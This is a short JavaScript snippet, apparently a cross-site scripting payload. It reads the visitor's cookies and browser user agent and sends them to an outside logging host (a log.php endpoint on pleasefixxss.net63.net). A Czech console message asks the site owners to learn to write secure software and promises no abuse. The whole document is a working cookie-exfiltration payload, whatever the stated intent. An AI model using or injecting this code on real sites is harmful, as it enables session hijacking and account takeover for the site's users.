var cookies = document.cookie;
var userAgent = navigator.userAgent;
var params = "?cookies=" + cookies + "&agent=" + userAgent;
var xhr = new XMLHttpRequest();

xhr.open('GET', 'http://pleasefixxss.net63.net/log.php' + params, true);
xhr.send(null);
console.log("DOBRÝ DEN, prosím vás naučte se vytvářet bezpečný software. děkuji. nebojte nic nezneužiji");
